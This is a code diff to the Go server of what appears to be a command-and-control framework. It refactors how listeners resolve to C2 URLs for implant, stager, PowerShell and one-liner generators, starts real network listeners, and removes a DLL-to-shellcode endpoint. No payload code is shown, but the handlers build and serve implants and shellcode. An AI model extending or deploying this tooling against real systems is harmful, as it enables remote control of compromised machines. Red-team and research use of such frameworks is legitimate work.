@@ -1,4 +1,4 @@
-package server
+﻿package server
 
 import (
 	"encoding/json"
@@ -19,6 +19,54 @@ import (
 	"github.com/gin-gonic/gin"
 	"github.com/google/uuid"
 )
+
+// resolvedListener holds the result of resolving a listener to C2 connection parameters.
+type resolvedListener struct {
+	C2URL     string
+	Protocol  string
+	DNSDomain string
+	DNSServer string
+}
+
+// resolveListener looks up a listener by ID and returns the C2 connection parameters.
+// For HTTP/HTTPS: C2URL = "scheme://host:port", Protocol = "http"
+// For TCP/TLS:    C2URL = "scheme://host:port", Protocol = "tcp"
+// For DNS:        C2URL = "dns://host", Protocol = "dns", DNSDomain/DNSServer set
+func (s *Server) resolveListener(listenerID uint) (*resolvedListener, error) {
+	var listener db.Listener
+	if err := s.db.First(&listener, listenerID).Error; err != nil || !listener.Enabled {
+		return nil, fmt.Errorf("listener not found or disabled")
+	}
+
+	sch := listener.Scheme
+	if sch == "" {
+		sch = listener.Protocol
+	}
+	if sch == "" {
+		sch = "http"
+		if listener.Type == "tcp" {
+			sch = "tcp"
+		}
+	}
+
+	r := &resolvedListener{}
+
+	switch sch {
+	case "tcp", "tls":
+		r.C2URL = fmt.Sprintf("%s://%s:%d", sch, listener.Host, listener.Port)
+		r.Protocol = "tcp"
+	case "dns":
+		r.C2URL = fmt.Sprintf("dns://%s", listener.Host)
+		r.Protocol = "dns"
+		r.DNSDomain = listener.Host
+		r.DNSServer = listener.Host
+	default:
+		r.C2URL = fmt.Sprintf("%s://%s:%d", sch, listener.Host, listener.Port)
+		r.Protocol = "http"
+	}
+
+	return r, nil
+}
 
 // Listener cache (optimization)
 var (
@@ -45,7 +93,7 @@ func (s *Server) getListeners() []db.Listener {
 		return listenerCache
 	}
 
-	s.db.Select("id", "name", "host", "port", "protocol").
+	s.db.Select("id", "name", "host", "port", "scheme", "type", "protocol").
 		Where("enabled = ?", true).Find(&listenerCache)
 	listenerCacheTime = time.Now()
 	return listenerCache
@@ -106,7 +154,7 @@ func (s *Server) handleGeneratePage(c *gin.Context) {
 		data[k] = v
 	}
 
-	s.renderPage(c, "generate_content", data)
+	s.renderPageOrJSON(c, data)
 }
 
 func (s *Server) handleGenerateEXE(c *gin.Context) {
@@ -147,36 +195,19 @@ func (s *Server) handleGenerateEXE(c *gin.Context) {
 	}
 
 	if !isP2P && !isDNS {
-		var listener db.Listener
-		if err := s.db.First(&listener, form.ListenerID).Error; err != nil || !listener.Enabled {
-			c.JSON(http.StatusBadRequest, gin.H{"error": "listener not found or disabled"})
+		resolved, err := s.resolveListener(form.ListenerID)
+		if err != nil {
+			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
 			return
 		}
-
-		sch := listener.Scheme
-		if sch == "" {
-			sch = listener.Protocol
-		}
-		if sch == "" {
-			sch = "http"
-			if listener.Type == "tcp" {
-				sch = "tcp"
-			}
-		}
-		form.C2URL = fmt.Sprintf("%s://%s:%d", sch, listener.Host, listener.Port)
-
-		transport := "http"
-		if sch == "tcp" || sch == "tls" {
-			transport = "tcp"
-		} else if sch == "dns" {
-			transport = "dns"
-			form.DNSDomain = listener.Host
-			// DNS server IP from listener host or config
+		form.C2URL = resolved.C2URL
+		form.Protocol = resolved.Protocol
+		if resolved.DNSDomain != "" {
+			form.DNSDomain = resolved.DNSDomain
 			if form.DNSServer == "" {
-				form.DNSServer = listener.Host
+				form.DNSServer = resolved.DNSServer
 			}
 		}
-		form.Protocol = transport
 	} else if isDNS && form.Protocol == "" {
 		form.Protocol = "dns"
 	}
@@ -283,35 +314,19 @@ func (s *Server) handleGenerateLinux(c *gin.Context) {
 	}
 
 	if !isP2P && !isDNS {
-		var listener db.Listener
-		if err := s.db.First(&listener, form.ListenerID).Error; err != nil || !listener.Enabled {
-			c.JSON(http.StatusBadRequest, gin.H{"error": "listener not found or disabled"})
+		resolved, err := s.resolveListener(form.ListenerID)
+		if err != nil {
+			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
 			return
 		}
-
-		sch := listener.Scheme
-		if sch == "" {
-			sch = listener.Protocol
-		}
-		if sch == "" {
-			sch = "http"
-			if listener.Type == "tcp" {
-				sch = "tcp"
-			}
-		}
-		form.C2URL = fmt.Sprintf("%s://%s:%d", sch, listener.Host, listener.Port)
-
-		transport := "http"
-		if sch == "tcp" || sch == "tls" {
-			transport = "tcp"
-		} else if sch == "dns" {
-			transport = "dns"
-			form.DNSDomain = listener.Host
+		form.C2URL = resolved.C2URL
+		form.Protocol = resolved.Protocol
+		if resolved.DNSDomain != "" {
+			form.DNSDomain = resolved.DNSDomain
 			if form.DNSServer == "" {
-				form.DNSServer = listener.Host
+				form.DNSServer = resolved.DNSServer
 			}
 		}
-		form.Protocol = transport
 	} else if isDNS && form.Protocol == "" {
 		form.Protocol = "dns"
 	}
@@ -412,35 +427,19 @@ func (s *Server) handleGenerateMacOS(c *gin.Context) {
 	}
 
 	if !isP2P && !isDNS {
-		var listener db.Listener
-		if err := s.db.First(&listener, form.ListenerID).Error; err != nil || !listener.Enabled {
-			c.JSON(http.StatusBadRequest, gin.H{"error": "listener not found or disabled"})
+		resolved, err := s.resolveListener(form.ListenerID)
+		if err != nil {
+			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
 			return
 		}
-
-		sch := listener.Scheme
-		if sch == "" {
-			sch = listener.Protocol
-		}
-		if sch == "" {
-			sch = "http"
-			if listener.Type == "tcp" {
-				sch = "tcp"
-			}
-		}
-		form.C2URL = fmt.Sprintf("%s://%s:%d", sch, listener.Host, listener.Port)
-
-		transport := "http"
-		if sch == "tcp" || sch == "tls" {
-			transport = "tcp"
-		} else if sch == "dns" {
-			transport = "dns"
-			form.DNSDomain = listener.Host
+		form.C2URL = resolved.C2URL
+		form.Protocol = resolved.Protocol
+		if resolved.DNSDomain != "" {
+			form.DNSDomain = resolved.DNSDomain
 			if form.DNSServer == "" {
-				form.DNSServer = listener.Host
+				form.DNSServer = resolved.DNSServer
 			}
 		}
-		form.Protocol = transport
 	} else if isDNS && form.Protocol == "" {
 		form.Protocol = "dns"
 	}
@@ -533,24 +532,13 @@ func (s *Server) handleGeneratePS1(c *gin.Context) {
 		return
 	}
 
-	var listener db.Listener
-	if err := s.db.First(&listener, form.ListenerID).Error; err != nil || !listener.Enabled {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "listener not found or disabled"})
+	resolved, err := s.resolveListener(form.ListenerID)
+	if err != nil {
+		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
 		return
 	}
-
-	scheme := "http"
-	if listener.Protocol == "https" || listener.Protocol == "tls" {
-		scheme = "https"
-	}
-	if listener.Type == "tcp" {
-		scheme = "tcp"
-	}
-	form.C2URL = fmt.Sprintf("%s://%s:%d", scheme, listener.Host, listener.Port)
-	form.Protocol = scheme
-	if scheme == "tcp" || scheme == "tls" {
-		form.Protocol = "tcp"
-	}
+	form.C2URL = resolved.C2URL
+	form.Protocol = resolved.Protocol
 
 	interval := form.Interval
 	if form.BeaconTime > 0 {
@@ -639,35 +627,19 @@ func (s *Server) handleGenerateOneLiner(c *gin.Context) {
 	}
 
 	if !isP2P && !isDNS {
-		var listener db.Listener
-		if err := s.db.First(&listener, form.ListenerID).Error; err != nil || !listener.Enabled {
-			c.JSON(http.StatusBadRequest, gin.H{"error": "listener not found or disabled"})
+		resolved, err := s.resolveListener(form.ListenerID)
+		if err != nil {
+			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
 			return
 		}
-
-		sch := listener.Scheme
-		if sch == "" {
-			sch = listener.Protocol
-		}
-		if sch == "" {
-			sch = "http"
-			if listener.Type == "tcp" {
-				sch = "tcp"
-			}
-		}
-		form.C2URL = fmt.Sprintf("%s://%s:%d", sch, listener.Host, listener.Port)
-
-		transport := "http"
-		if sch == "tcp" || sch == "tls" {
-			transport = "tcp"
-		} else if sch == "dns" {
-			transport = "dns"
-			form.DNSDomain = listener.Host
+		form.C2URL = resolved.C2URL
+		form.Protocol = resolved.Protocol
+		if resolved.DNSDomain != "" {
+			form.DNSDomain = resolved.DNSDomain
 			if form.DNSServer == "" {
-				form.DNSServer = listener.Host
+				form.DNSServer = resolved.DNSServer
 			}
 		}
-		form.Protocol = transport
 	} else if isDNS && form.Protocol == "" {
 		form.Protocol = "dns"
 	}
@@ -991,7 +963,42 @@ func (s *Server) handleListenerDetail(c *gin.Context) {
 		data[k] = v
 	}
 
-	s.renderPage(c, "listener_detail_content", data)
+	s.renderPageOrJSON(c, data)
+}
+
+// startListenerForRecord creates a real network listener for a DB listener record.
+// Handles HTTP/HTTPS/TCP/TLS schemes, port conflict detection, and main server port skip.
+func (s *Server) startListenerForRecord(l *db.Listener, context string) {
+	scheme := l.Scheme
+	if scheme == "" {
+		scheme = l.Type
+	}
+	if scheme != "http" && scheme != "https" && scheme != "tcp" && scheme != "tls" {
+		return
+	}
+
+	addr := l.Host + ":" + itoa(l.Port)
+	key := scheme + "://" + addr
+
+	// Skip if this is the main server address (already served)
+	mainAddr := s.cfg.Server.Host + ":" + itoa(s.cfg.Server.Port)
+	if addr == mainAddr && (scheme == "http" || scheme == "https") {
+		slog.Debug("Listener matches main server address, no extra listener needed",
+			"key", key, "context", context)
+		return
+	}
+
+	// Check port availability
+	if !isPortAvailable(l.Host, l.Port) {
+		slog.Warn("Port not available for listener, skipping",
+			"key", key, "context", context)
+		return
+	}
+
+	if err := s.startExtraListener(key, addr, scheme); err != nil {
+		slog.Error("Failed to start listener",
+			"key", key, "context", context, "err", err)
+	}
 }
 
 func (s *Server) handleCreateListener(c *gin.Context) {
@@ -1044,6 +1051,10 @@ func (s *Server) handleCreateListener(c *gin.Context) {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
 		return
 	}
+
+	// Start a real listener for the requested port/type.
+	s.startListenerForRecord(&l, "created")
+
 	c.JSON(http.StatusOK, gin.H{"success": true, "listener": l})
 }
 
@@ -1123,6 +1134,19 @@ func (s *Server) handleUpdateListener(c *gin.Context) {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
 		return
 	}
+
+	// Sync extra listener state (start/stop/restart)
+	oldKey := l.Scheme + "://" + l.Host + ":" + itoa(l.Port)
+	changed := updates.Host != "" || updates.Port != 0 || updates.Scheme != "" || updates.Protocol != "" || updates.Type != ""
+	if changed {
+		s.stopExtraListener(oldKey)
+	}
+	if l.Enabled {
+		s.startListenerForRecord(&l, "updated")
+	} else if updates.Enabled != nil && !*updates.Enabled {
+		s.stopExtraListener(oldKey)
+	}
+
 	c.JSON(http.StatusOK, gin.H{"success": true, "listener": l})
 }
 
@@ -1138,6 +1162,13 @@ func (s *Server) handleDeleteListener(c *gin.Context) {
 			"agent_count": agentCount,
 		})
 		return
+	}
+
+	// Load listener to stop any running extra listener
+	var l db.Listener
+	if err := s.db.First(&l, id).Error; err == nil {
+		key := l.Scheme + "://" + l.Host + ":" + itoa(l.Port)
+		s.stopExtraListener(key)
 	}
 
 	if err := s.db.Delete(&db.Listener{}, id).Error; err != nil {
@@ -1175,28 +1206,17 @@ func (s *Server) handleGenerateStager(c *gin.Context) {
 	}
 
 	if !isDNS {
-		var listener db.Listener
-		if err := s.db.First(&listener, form.ListenerID).Error; err != nil || !listener.Enabled {
-			c.JSON(http.StatusBadRequest, gin.H{"error": "listener not found or disabled"})
+		resolved, err := s.resolveListener(form.ListenerID)
+		if err != nil {
+			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
 			return
 		}
-
-		sch := listener.Scheme
-		if sch == "" {
-			sch = listener.Protocol
-		}
-		if sch == "" {
-			sch = "http"
-			if listener.Type == "tcp" {
-				sch = "tcp"
-			}
-		}
-		form.C2URL = fmt.Sprintf("%s://%s:%d", sch, listener.Host, listener.Port)
-
-		if sch == "dns" {
-			form.DNSDomain = listener.Host
+		form.C2URL = resolved.C2URL
+		form.Protocol = resolved.Protocol
+		if resolved.DNSDomain != "" {
+			form.DNSDomain = resolved.DNSDomain
 			if form.DNSServer == "" {
-				form.DNSServer = listener.Host
+				form.DNSServer = resolved.DNSServer
 			}
 		}
 	}
@@ -1206,9 +1226,14 @@ func (s *Server) handleGenerateStager(c *gin.Context) {
 		interval = form.BeaconTime
 	}
 
+	proto := form.Protocol
+	if proto == "" {
+		proto = "http"
+	}
+
 	cfg := payload.ImplantConfig{
 		C2URL:         form.C2URL,
-		Protocol:      "http",
+		Protocol:      proto,
 		Interval:      interval,
 		Jitter:        form.Jitter,
 		UserAgent:     form.UserAgent,
@@ -1287,28 +1312,17 @@ func (s *Server) handleGenerateStagerLinux(c *gin.Context) {
 	}
 
 	if !isDNS {
-		var listener db.Listener
-		if err := s.db.First(&listener, form.ListenerID).Error; err != nil || !listener.Enabled {
-			c.JSON(http.StatusBadRequest, gin.H{"error": "listener not found or disabled"})
+		resolved, err := s.resolveListener(form.ListenerID)
+		if err != nil {
+			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
 			return
 		}
-
-		sch := listener.Scheme
-		if sch == "" {
-			sch = listener.Protocol
-		}
-		if sch == "" {
-			sch = "http"
-			if listener.Type == "tcp" {
-				sch = "tcp"
-			}
-		}
-		form.C2URL = fmt.Sprintf("%s://%s:%d", sch, listener.Host, listener.Port)
-
-		if sch == "dns" {
-			form.DNSDomain = listener.Host
+		form.C2URL = resolved.C2URL
+		form.Protocol = resolved.Protocol
+		if resolved.DNSDomain != "" {
+			form.DNSDomain = resolved.DNSDomain
 			if form.DNSServer == "" {
-				form.DNSServer = listener.Host
+				form.DNSServer = resolved.DNSServer
 			}
 		}
 	}
@@ -1318,9 +1332,14 @@ func (s *Server) handleGenerateStagerLinux(c *gin.Context) {
 		interval = form.BeaconTime
 	}
 
+	proto := form.Protocol
+	if proto == "" {
+		proto = "http"
+	}
+
 	cfg := payload.ImplantConfig{
 		C2URL:         form.C2URL,
-		Protocol:      "http",
+		Protocol:      proto,
 		Interval:      interval,
 		Jitter:        form.Jitter,
 		UserAgent:     form.UserAgent,
@@ -1404,7 +1423,7 @@ func (s *Server) handleListenersPage(c *gin.Context) {
 		data[k] = v
 	}
 
-	s.renderPage(c, "listeners_content", data)
+	s.renderPageOrJSON(c, data)
 }
 
 func (s *Server) handleGenerateDonut(c *gin.Context) {
@@ -1446,39 +1465,6 @@ func (s *Server) handleGenerateDonut(c *gin.Context) {
 	c.Data(http.StatusOK, "application/octet-stream", sc)
 }
 
-func (s *Server) handleGenerateSRDI(c *gin.Context) {
-	file, err := c.FormFile("dll")
-	if err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "DLL file required"})
-		return
-	}
-	f, err := file.Open()
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
-		return
-	}
-	defer f.Close()
-
-	data, err := io.ReadAll(f)
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
-		return
-	}
-
-	exportName := c.DefaultPostForm("export", "")
-	arch := c.DefaultPostForm("arch", "amd64")
-
-	sc, err := payload.GenerateSRDIShellcode(data, exportName, arch == "amd64")
-	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
-		return
-	}
-
-	outName := c.DefaultPostForm("filename", "rdi_loader.bin")
-	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", outName))
-	c.Data(http.StatusOK, "application/octet-stream", sc)
-}
-
 func (s *Server) handleGenerateShellcode(c *gin.Context) {
 	cmd := c.PostForm("command")
 	if cmd == "" {
@@ -1496,3 +1482,4 @@ func (s *Server) handleGenerateShellcode(c *gin.Context) {
 	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", outName))
 	c.Data(http.StatusOK, "application/octet-stream", sc)
 }
+
